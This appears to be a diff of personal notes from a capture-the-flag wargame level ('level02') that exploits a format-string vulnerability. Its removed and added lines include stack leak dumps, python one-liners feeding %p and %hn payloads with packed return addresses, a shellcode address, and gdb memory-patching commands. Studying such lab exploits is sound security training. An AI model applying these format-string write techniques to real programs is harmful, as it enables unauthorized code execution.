@@ -194,67 +194,26 @@ if (nb2 != 41)
 0x0000000000400ab6 <+674>:	callq  0x400710 <exit@plt>
 
 
-AAAA
-ffffe4e0.
-0.
-2e.
-2a2a2a2a.
-2a2a2a2a.
-ffffe6d8.
-f7ff9a08.
-2e78252e.
-78252e78.
-252e7825.
-2e78252e.
-78252e78.
-252e7825.
-2e78252e.
-78252e78.
-252e7825.
-2e78252e.
-78252e78.
-252e7825.
-78252e.
-0.
-4c427750.
-544d3870.
-787a3753.
-70436e78.
-39735454.
-0.
-41414141. // %28$n
-
-
 ; eip : 0x7fffffffbd88
 ; 0x0000000000400aa7
 ; initalement L
 
+7 reg 
+
+python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p' + '\n' + 'a' + '\n'" | ./level02
+
 78252e78.
 252e7825.
 2e78252e.
 
-shellcode : 0x00007fffffffcd0b
-
-;0x7fffffffbd8e : 0x00 0x00
-
-0x7fffffffbd88 : 0x0bcd ; 3021
-
- < 62386 >
-
-0x7fffffffbd8c : 0xff7f ; 65407
-
-< 128 >
-
-0x7fffffffbd8a : 0xffff ; 65535
-
-
-'\x88''\xbd''\xff''\xff''\xff''\x7f''\x00''\x00' + '\x8a''\xbd''\xff''\xff''\xff''\x7f''\x00''\x00' + '\x8c''\xbd''\xff''\xff''\xff''\x7f''\x00''\x00' + '%02997x' + '%28$hn' + '%062386x' + '%29$hn' + '%0128x' + '%30$hn'
-
-python -c "print '\x88''\xbd''\xff''\xff''\xff''\x7f' + '\x8a''\xbd''\xff''\xff''\xff''\x7f' + '\x8c''\xbd''\xff''\xff''\xff''\x7f' + '%02997x' + '%28\$hn' + '%062386x' + '%29\$hn' + '%0128x' + '%30\$hn' + '\x0a' + 'a' + '\x0a'" > b ; gdb /home/users/level02/level02
-
-python -c "print 'AAAAAAAA' + 'BBBBBBBB' + 'CCCCCCCC' + '%02997x' + '%28\$hn' + '%062386x' + '%29\$hn' + '%0128x' + '%30\$hn' + '\x0a' + 'a' + '\x0a'" > b ; gdb /home/users/level02/level02
 
 rsp : 0x7fffffffe4c8
 password : 0x7fffffffe550
 
-136
+set {char}0x400bb2 = '/'
+set {char}0x400bb3 = 't'
+set {char}0x400bb4 = 'm'
+set {char}0x400bb5 = 'p'
+set {char}0x400bb6 = '/'
+set {char}0x400bb7 = 'a'
+set {char}0x400bb8 = '\0'
